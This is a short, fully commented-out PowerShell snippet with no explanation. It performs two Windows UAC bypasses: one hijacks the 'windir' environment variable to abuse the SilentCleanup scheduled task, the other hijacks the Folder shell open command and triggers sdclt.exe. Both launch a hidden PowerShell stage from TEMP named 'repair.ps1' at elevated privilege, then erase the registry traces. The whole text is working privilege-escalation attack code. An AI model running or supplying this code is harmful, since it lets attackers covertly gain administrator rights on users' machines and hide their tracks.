# param([string]$stage = "$env:TEMP\repair.ps1")
# $command = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$stage`""
# Set-ItemProperty -Path 'HKCU:\Environment' -Name 'windir' -Value "$command & rem "
# Start-Process schtasks.exe -ArgumentList '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I' -Wait
# Start-Sleep -Seconds 2
# Remove-ItemProperty -Path 'HKCU:\Environment' -Name 'windir'
# $folder = 'HKCU:\Software\Classes\Folder\shell\open\command'
# New-Item -Path $folder -Force | Out-Null
# Set-Item -Path $folder -Value $command
# Start-Process sdclt.exe -ArgumentList '/KickOffElev' -Wait
# Remove-Item -Path $folder -Recurse -Force
